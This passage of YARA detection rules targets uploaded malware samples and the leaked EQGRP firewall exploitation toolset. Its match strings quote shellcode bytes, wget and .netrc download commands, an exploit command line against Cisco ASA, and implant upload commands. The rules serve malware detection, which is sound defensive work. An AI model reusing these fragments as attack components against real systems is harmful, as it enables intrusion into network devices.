URL|Update : File Downloaded , Executing new one in temp dir...|\" fullword ascii\n      $s1 = \"MSRSAAP.EXE\" fullword wide\n      $s2 = \"Command successfully executed!|\" fullword ascii\n      $s3 = \"BTMemoryLoadLibary: Get DLLEntyPoint failed\" fullword ascii\n      $s4 = \"I wasn't able to open the hosts file, maybe because UAC is enabled in remote computer!\" fullword ascii\n      $s5 = \"\\\\Internet Explorer\\\\iexplore.exe\" ascii\n      $s6 = \"ping 127.0.0.1 -n 4 > NUL && \\\"\" fullword ascii\n      $s7 = \"BTMemoryGetProcAddress: DLL doesn't export anything\" fullword ascii\n      $s8 = \"POST /index.php/1.0\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( 1 of ( $x* ) or 3 of ( $s* ) ) ) or ( all of them )\n}\n\nrule Malware_QA_tls_RID2C7D : DEMO EXE FILE MAL {\n   meta:\n      description = \"VT Research QA uploaded malware - file tls.exe\"\n      author = \"Florian Roth\"\n      reference = \"VT Research QA\"\n      date = \"2016-08-29 09:51:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f06d1f2bee2eb6590afbfa7f011ceba9bd91ba31cdc721bc728e13b547ac9370\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\funoverip\\\\ultimate-payload-template1\\\\\" ascii\n      $s2 = \"ULTIMATEPAYLOADTEMPLATE1\" fullword wide\n      $s3 = \"ultimate-payload-template1\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them ) or ( all of them )\n}\n\nrule Malware_QA_get_The_FucKinG_IP_RID31C8 : DEMO EXE FILE MAL {\n   meta:\n      description = \"VT Research QA uploaded malware - file get The FucKinG IP.exe\"\n      author = \"Florian Roth\"\n      reference = \"VT Research QA\"\n      date = \"2016-08-29 13:37:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7b2c04e384919075be96e3412d92c14fc1165d1bc7556fd207488959c5c4d2f7\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\Users\\\\Mdram ahmed\\\\AppData\" \n      $x2 = \"\\\\Local\\\\Temporary Projects\\\\get The FucKinG IP\\\\\" ascii\n      $x3 = \"get The FucKinG IP.exe\" fullword wide\n      $x4 = \"get ip by mdr3m\" fullword wide\n      $x5 = \"MDR3M kik: Mdr3mhm\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 1 of ( $x* ) ) or ( 2 of them )\n}\n\nrule Malware_QA_1177_RID2BFA : DEMO FILE MAL SCRIPT {\n   meta:\n      description = \"VT Research QA uploaded malware - file 1177.vbs\"\n      author = \"Florian Roth\"\n      reference = \"VT Research QA\"\n      date = \"2016-08-29 09:29:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ff3a2740330a6cbae7888e7066942b53015728c367cf9725e840af5b2a3fa247\"\n      tags = \"DEMO, FILE, MAL, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \".specialfolders (\\\"startup\\\") & \\\"\\\\ServerName.EXE\\\"\" fullword ascii\n      $x2 = \"expandenvironmentstrings(\\\"%%InsallDir%%\\\") \" ascii\n      $s1 = \"CreateObject(\\\"WScript.Shell\\\").Run(\" ascii\n      $s2 = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAA\" ascii\n      $s3 = \"cial Thank's to Dev-point.com\" fullword ascii\n      $s4 = \".createElement(\\\"tmp\\\")\" fullword ascii\n      $s5 = \"'%CopyToStartUp%\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x4d27 and filesize < 100KB and ( 1 of ( $x* ) or 4 of ( $s* ) ) ) or ( 5 of them )\n}\n\nrule WCE_in_memory_RID2C1E : DEMO HKTL T1003 {\n   meta:\n      description = \"Detects Windows Credential Editor (WCE) in memory (and also on disk)\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-08-28 09:35:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"wkKUSvflehHr::o:t:s:c:i:d:a:g:\" fullword ascii\n      $s2 = \"wceaux.dll\" fullword ascii\n   condition: \n      all of them\n}\n\nrule b374k_back_connect_RID2DB5 : APT DEMO EXE FILE T1068 {\n   meta:\n      description = \"Detects privilege escalation tool\"\n      author = \"Florian Roth\"\n      reference = \"Internal Analysis\"\n      date = \"2016-08-18 10:43:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c8e16f71f90bbaaef27ccaabb226b43762ca6f7e34d7d5585ae0eb2d36a4bae5\"\n      tags = \"APT, DEMO, EXE, FILE, T1068\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"AddAtomACreatePro\" fullword ascii\n      $s2 = \"shutdow\" fullword ascii\n      $s3 = \"/config/i386\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 10KB and all of them )\n}\n\nrule APT_EQGRP_RC5_RC6_Opcode_RID2EE0 : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - RC5 / RC6 opcode\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/incidents/75812/the-equation-giveaway/\"\n      date = \"2016-08-17 11:33:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = { 8B 74 91 FC 81 EE 47 86 C8 61 89 34 91 42 83 FA 2B } \n   condition: \n      1 of them\n}\n\nrule APT_EQGRP_screamingplow_RID2FAE : APT DEMO SCRIPT {\n   meta:\n      description = \"EQGRP Toolset Firewall - file screamingplow.sh\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 12:07:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c7f4104c4607a03a1d27c832e1ebfc6ab252a27a1709015b5f1617b534f0090a\"\n      tags = \"APT, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"What is the name of your PBD:\" fullword ascii\n      $s2 = \"You are now ready for a ScreamPlow\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule APT_EQGRP_MixText_RID2D06 : APT DEMO SCRIPT {\n   meta:\n      description = \"EQGRP Toolset Firewall - file MixText.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:14:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e4d24e30e6cc3a0aa0032dbbd2b68c60bac216bef524eaf56296430aa05b3795\"\n      tags = \"APT, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"BinStore enabled implants.\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule APT_EQGRP_payload_RID2D1D : APT DEMO SCRIPT {\n   meta:\n      description = \"EQGRP Toolset Firewall - file payload.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:18:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"21bed6d699b1fbde74cbcec93575c9694d5bea832cd191f59eb3e4140e5c5e07\"\n      tags = \"APT, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"can't find target version module!\" fullword ascii\n      $s2 = \"class Payload:\" fullword ascii\n   condition: \n      all of them\n}\n\nrule APT_EQGRP_userscript_RID2E87 : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - file userscript.FW\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:18:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5098ff110d1af56115e2c32f332ff6e3973fb7ceccbd317637c9a72a3baa43d7\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Are you sure? Don't forget that NETSCREEN firewalls require BANANALIAR!! \" fullword ascii\n   condition: \n      1 of them\n}\n\nrule APT_EQGRP_uninstallPBD_RID2EE3 : APT DEMO SCRIPT {\n   meta:\n      description = \"EQGRP Toolset Firewall - file uninstallPBD.bat\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:33:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"692fdb449f10057a114cf2963000f52ce118d9a40682194838006c66af159bd0\"\n      tags = \"APT, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"memset 00e9a05c 4 38845b88\" fullword ascii\n      $s2 = \"_hidecmd\" ascii\n      $s3 = \"memset 013abd04 1 0d\" fullword ascii\n   condition: \n      all of them\n}\n\nrule APT_EQGRP_tinyexec_RID2D9C : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files tinyexec\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:39:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = { 73 68 73 74 72 74 61 62 00 2E 74 65 78 74 } \n      $s2 = { 5A 58 55 52 89 E2 55 50 89 E1 } \n   condition: \n      uint32 ( 0 ) == 0x464c457f and filesize < 270 and all of them\n}\n\nrule APT_EQGRP_callbacks_RID2DD3 : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - Callback addresses\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:48:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"30.40.50.60:9342\" fullword ascii wide\n   condition: \n      1 of them\n}\n\nrule APT_EQGRP_Unique_Strings_RID2FF3 : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - Unique strings\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 12:19:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/BananaGlee/ELIGIBLEBOMB\" ascii\n      $s2 = \"Protocol must be either http or https (Ex: https://1.2.3.4:1234)\" \n   condition: \n      1 of them\n}\n\nrule APT_install_get_persistent_filenames_RID35AE : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file install_get_persistent_filenames\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 16:23:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4a50ec4bf42087e932e9e67e0ea4c09e52a475d351981bb4c9851fda02b35291\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Generates the persistence file name and prints it out.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and all of them )\n}\n\nrule APT_EQGRP_tunnel_state_reader_RID321B : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - file tunnel_state_reader\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 13:51:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"49d48ca1ec741f462fde80da68b64dfa5090855647520d29e345ef563113616c\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Active connections will be maintained for this tunnel. Timeout:\" fullword ascii\n      $s5 = \"%s: compatible with BLATSTING version 1.2\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule APT_EQGRP_eligiblecandidate_RID310D : APT DEMO SCRIPT {\n   meta:\n      description = \"EQGRP Toolset Firewall - file eligiblecandidate.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 13:06:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c4567c00734dedf1c875ecbbd56c1561a1610bedb4621d9c8899acec57353d86\"\n      tags = \"APT, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $o1 = \"Connection timed out. Only a problem if the callback was not received.\" fullword ascii\n      $o2 = \"Could not reliably detect cookie. Using 'session_id'...\" fullword ascii\n      $c1 = \"def build_exploit_payload(self,cmd=\\\"/tmp/httpd\\\"):\" fullword ascii\n      $c2 = \"self.build_exploit_payload(cmd)\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule APT_EQGRP_BUSURPER_2211_724_RID2ECC : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BUSURPER-2211-724.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:29:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d809d6ff23a9eee53d2132d2c13a9ac5d0cb3037c60e229373fc59a4f14bc744\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".got_loader\" fullword ascii\n      $s2 = \"_start_text\" ascii\n      $s3 = \"IMPLANT\" fullword ascii\n      $s4 = \"KEEPGOING\" fullword ascii\n      $s5 = \"upgrade_implant\" fullword ascii\n   condition: \n      all of them\n}\n\nrule APT_EQGRP_networkProfiler_orderScans_RID34F3 : APT DEMO SCRIPT {\n   meta:\n      description = \"EQGRP Toolset Firewall - file networkProfiler_orderScans.sh\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 15:52:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ea986ddee09352f342ac160e805312e3a901e58d2beddf79cd421443ba8c9898\"\n      tags = \"APT, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Unable to save off predefinedScans directory\" fullword ascii\n      $x2 = \"Re-orders the networkProfiler scans so they show up in order in the LP\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule APT_EQGRP_epicbanana_2_1_0_1_RID3075 : APT DEMO SCRIPT {\n   meta:\n      description = \"EQGRP Toolset Firewall - file epicbanana_2.1.0.1.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 12:40:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4b13cc183c3aaa8af43ef3721e254b54296c8089a0cd545ee3b867419bb66f61\"\n      tags = \"APT, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"failed to create version-specific payload\" fullword ascii\n      $s2 = \"(are you sure you did \\\"make [version]\\\" in versions?)\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule APT_EQGRP_sniffer_xml2pcap_RID30A6 : APT DEMO T1040 {\n   meta:\n      description = \"EQGRP Toolset Firewall - file sniffer_xml2pcap\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 12:48:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f5e5d75cfcd86e5c94b0e6f21bbac886c7e540698b1556d88a83cc58165b8e42\"\n      tags = \"APT, DEMO, T1040\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"-s/--srcip <sourceIP>  Use given source IP (if sniffer doesn't collect source IP)\" fullword ascii\n      $x2 = \"convert an XML file generated by the BLATSTING sniffer module into a pcap capture file.\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule APT_EQGRP_BananaAid_RID2D82 : APT DEMO T1105 {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BananaAid\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:34:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7a4fb825e63dc612de81bc83313acf5eccaa7285afc05941ac1fef199279519f\"\n      tags = \"APT, DEMO, T1105\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"(might have to delete key in ~/.ssh/known_hosts on linux box)\" fullword ascii\n      $x2 = \"scp BGLEE-\" ascii\n      $x3 = \"should be 4bfe94b1 for clean bootloader version 3.0; \" fullword ascii\n      $x4 = \"scp <configured implant> <username>@<IPaddr>:onfig\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule APT_EQGRP_bo_RID2B04 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file bo\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 08:48:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"aa8b363073e8ae754b1836c30f440d7619890ded92fb5b97c73294b15d22441d\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ERROR: failed to open %s: %d\" fullword ascii\n      $s2 = \"__libc_start_main@@GLIBC_2.0\" ascii\n      $s3 = \"serial number: %s\" fullword ascii\n      $s4 = \"strerror@@GLIBC_2.0\" fullword ascii\n      $s5 = \"ERROR: mmap failed: %d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 20KB and all of them )\n}\n\nrule APT_EQGRP_SecondDate_2211_RID2F32 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file SecondDate-2211.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:46:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2337d0c81474d03a02c404cada699cf1b86c3c248ea808d4045b86305daa2607\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SD_processControlPacket\" fullword ascii\n      $s2 = \"Encryption_rc4SetKey\" fullword ascii\n      $s3 = \".got_loader\" fullword ascii\n      $s4 = \"^GET.*(?:/ |\\\\.(?:htm|asp|php)).*\\\\r\\\\n\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 200KB and all of them )\n}\n\nrule APT_EQGRP_config_jp1_UA_RID2F08 : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - file config_jp1_UA.pl\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:39:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2f50b6e9891e4d7fd24cc467e7f5cfe348f56f6248929fec4bbee42a5001ae56\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"This program will configure a JETPLOW Userarea file.\" fullword ascii\n      $x2 = \"Error running config_implant.\" fullword ascii\n      $x3 = \"NOTE:  IT ASSUMES YOU ARE OPERATING IN THE INSTALL/LP/JP DIRECTORY. THIS ASSUMPTION \" fullword ascii\n      $x4 = \"First IP address for beacon destination [127.0.0.1]\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule APT_EQGRP_BBALL_M50FW08_2201_RID2ECA : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BBALL_M50FW08-2201.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:29:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"80c0b68adb12bf3c15eff9db70a57ab999aad015da99c4417fdfd28156d8d3f7\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".got_loader\" fullword ascii\n      $s2 = \"LOADED\" fullword ascii\n      $s3 = \"pageTable.c\" fullword ascii\n      $s4 = \"_start_text\" ascii\n      $s5 = \"handler_readBIOS\" fullword ascii\n      $s6 = \"KEEPGOING\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and 5 of ( $s* ) )\n}\n\nrule APT_EQGRP_BUSURPER_3001_724_RID2ECA : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BUSURPER-3001-724.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:29:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6b558a6b8bf3735a869365256f9f2ad2ed75ccaa0eefdc61d6274df4705e978b\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"IMPLANT\" fullword ascii\n      $s2 = \"KEEPGOING\" fullword ascii\n      $s3 = \"upgrade_implant\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 200KB and 2 of them ) or ( all of them )\n}\n\nrule APT_EQGRP_workit_RID2CD3 : APT DEMO SCRIPT T1105 {\n   meta:\n      description = \"EQGRP Toolset Firewall - file workit.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:05:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-20\"\n      hash1 = \"fb533b4d255b4e6072a4fa2e1794e38a165f9aa66033340c2f4f8fd1da155fac\"\n      tags = \"APT, DEMO, SCRIPT, T1105\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"macdef init > /tmp/.netrc;\" fullword ascii\n      $s2 = \"/usr/bin/wget http://\" ascii\n      $s3 = \"HOME=/tmp ftp\" fullword ascii\n      $s4 = \" >> /tmp/.netrc;\" fullword ascii\n      $s5 = \"/usr/rapidstream/bin/tftp\" fullword ascii\n      $s6 = \"created shell_command:\" fullword ascii\n      $s7 = \"rm -f /tmp/.netrc;\" fullword ascii\n      $s8 = \"echo quit >> /tmp/.netrc;\" fullword ascii\n      $s9 = \"echo binary >> /tmp/.netrc;\" fullword ascii\n      $s10 = \"chmod 600 /tmp/.netrc;\" fullword ascii\n      $s11 = \"created cli_command:\" fullword ascii\n   condition: \n      6 of them\n}\n\nrule APT_EQGRP_tinyhttp_setup_RID3047 : APT DEMO FILE SCRIPT {\n   meta:\n      description = \"EQGRP Toolset Firewall - file tinyhttp_setup.sh\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 12:33:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3d12c83067a9f40f2f5558d3cf3434bbc9a4c3bb9d66d0e3c0b09b9841c766a0\"\n      tags = \"APT, DEMO, FILE, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"firefox http://127.0.0.1:8000/$_name\" fullword ascii\n      $x2 = \"What is the name of your implant:\" fullword ascii\n      $x3 = \"killall thttpd\" fullword ascii\n      $x4 = \"copy http://<IP>:80/$_name flash:/$_name\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 2KB and 1 of ( $x* ) ) or ( all of them )\n}\n\nrule APT_EQGRP_shellcode_RID2DE6 : APT DEMO SCRIPT {\n   meta:\n      description = \"EQGRP Toolset Firewall - file shellcode.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:51:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ac9decb971dd44127a6ca0d35ac153951f0735bb4df422733046098eca8f8b7f\"\n      tags = \"APT, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"execute_post = '\\\\xe8\\\\x00\\\\x00\\\\x00\\\\x00\\\\x5d\\\\xbe\\\\xef\\\\xbe\\\\xad\\\\xde\\\\x89\\\\xf7\\\\x89\\\\xec\\\\x29\\\\xf4\\\\xb8\\\\x03\\\\x00\\\\x00\\\\x00\" ascii\n      $s2 = \"tiny_exec = '\\\\x7f\\\\x45\\\\x4c\\\\x46\\\\x01\\\\x01\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x02\\\\x00\\\\x03\\\\x00\\\\x01\\\\x00\\\\x00\" ascii\n      $s3 = \"auth_id = '\\\\x31\\\\xc0\\\\xb0\\\\x03\\\\x31\\\\xdb\\\\x89\\\\xe1\\\\x31\\\\xd2\\\\xb6\\\\xf0\\\\xb2\\\\x0d\\\\xcd\\\\x80\\\\x3d\\\\xff\\\\xff\\\\xff\\\\xff\\\\x75\\\\x07\" ascii\n      $c1 = { e8 00 00 00 00 5d be ef be ad de 89 f7 89 ec 29 f4 b8 03 00 00 00 } \n      $c3 = { 31 c0 b0 03 31 db 89 e1 31 d2 b6 f0 b2 0d cd 80 3d ff ff ff ff 75 07 } \n   condition: \n      1 of them\n}\n\nrule APT_EQGRP_EPBA_RID2B4B : APT DEMO FILE SCRIPT {\n   meta:\n      description = \"EQGRP Toolset Firewall - file EPBA.script\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 09:00:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"53e1af1b410ace0934c152b5df717d8a5a8f5fdd8b9eb329a44d94c39b066ff7\"\n      tags = \"APT, DEMO, FILE, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"./epicbanana_2.0.0.1.py -t 127.0.0.1 --proto=ssh --username=cisco --password=cisco --target_vers=asa804 --mem=NA -p 22 \" fullword ascii\n      $x2 = \"-t TARGET_IP, --target_ip=TARGET_IP -- Either 127.0.0.1 or Win Ops IP\" fullword ascii\n      $x3 = \"./bride-1100 --lp 127.0.0.1 --implant 127.0.0.1 --sport RHP --dport RHP\" fullword ascii\n      $x4 = \"--target_vers=TARGET_VERS    target Pix version (pix712, asa804) (REQUIRED)\" fullword ascii\n      $x5 = \"-p DEST_PORT, --dest_port=DEST_PORT defaults: telnet=23, ssh=22 (optional) - Change to LOCAL redirect port\" fullword ascii\n      $x6 = \"this operation is complete, BananaGlee will\" fullword ascii\n      $x7 = \"cd /current/bin/FW/BGXXXX/Install/LP\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2023 and filesize < 7KB and 1 of ( $x* ) ) or ( 3 of them )\n}\n\nrule APT_EQGRP_BPIE_RID2B53 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - file BPIE-2201.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 09:01:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"697e80cf2595c85f7c931693946d295994c55da17a400f2c9674014f130b4688\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"profProcessPacket\" fullword ascii\n      $s2 = \".got_loader\" fullword ascii\n      $s3 = \"getTimeSlotCmdHandler\" fullword ascii\n      $s4 = \"getIpIpCmdHandler\" fullword ascii\n      $s5 = \"LOADED\" fullword ascii\n      $s6 = \"profStartScan\" fullword ascii\n      $s7 = \"tmpData.1\" fullword ascii\n      $s8 = \"resetCmdHandler\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 70KB and 6 of ( $s* ) )\n}\n\nrule APT_EQGRP_jetplow_SH_RID2E32 : APT DEMO SCRIPT {\n   meta:\n      description = \"EQGRP Toolset Firewall - file jetplow.sh\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:04:11\"\n      score = 75\n      customer = \"demo\"\n      